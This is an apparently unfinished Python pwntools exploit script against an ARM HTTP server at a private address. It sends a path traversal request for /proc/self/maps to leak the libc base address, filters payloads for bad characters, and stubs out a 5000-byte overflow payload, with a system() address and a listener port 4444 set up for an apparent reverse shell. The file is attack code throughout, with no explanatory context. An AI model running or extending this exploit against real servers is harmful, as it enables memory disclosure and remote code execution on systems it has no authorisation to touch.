#! /usr/bin/python

from pwn import *
import socket
from ctypes import c_uint

context.arch='arm'
context.bits=32
context.terminal='sh'

HOST = "192.168.192.128"
PORT = 8080
URL = "http://192.168.192.128"+ ":" + str(PORT)
LHOST = socket.gethostbyname(socket.gethostname())
LPORT = 4444

GET_REQUEST = "GET {} HTTP/1.1\r\n\r\n"

LIBC_BASE = 0x40000000
SYSTEM_ADDR = 0x000109c8

def has_bad_chars( payload ):
    bar = bytearray(payload)
    for c in [ '\x00', '\x0a', '\x0d', '\x20', '\x3f' ]:
        if c in bar:
            message = 'Payload contains bad character \'{}\' at offset {}'
            raise SystemExit(message.format(hex(ord(c)), bar.find(c)))
    return payload

def address_leak():
    # Leaks memory maps
    payload = '/'
    payload += '../../../../proc/self/maps'
    return payload

def build_payload():
    payload = '/'
    payload += 'A'*5000
    return payload

def main():
    payload = address_leak()
    has_bad_chars( payload )

    sock = remote(HOST, PORT)
    sock.send(GET_REQUEST.format(payload))
    LIBC_BASE = 0x4000000
    while sock.can_recv(1):
        line = sock.recvline()
        if 'libc.so' in line and 'r-x' in line:
            # Grab first 8 bytes to parse leaked address
            print line[0:8]
            LIBC_BASE = int( line[0:7], 16 )
    sock.close()

if __name__ == '__main__':
    main()
